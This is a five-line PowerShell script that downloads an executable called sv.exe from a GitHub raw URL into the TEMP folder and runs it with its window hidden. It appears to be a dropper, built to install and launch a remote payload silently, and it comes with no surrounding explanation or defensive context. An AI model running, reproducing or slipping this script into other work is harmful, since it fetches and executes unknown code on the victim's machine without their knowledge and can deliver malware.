$exeUrl="https://raw.githubusercontent.com/skailol/ps1/main/sv.exe"
$exePath="$env:TEMP\sv.exe"
(New-Object Net.WebClient).DownloadFile($exeUrl, $exePath)
Start-Process -FilePath $exePath -WindowStyle Hidden
cmd /c exit
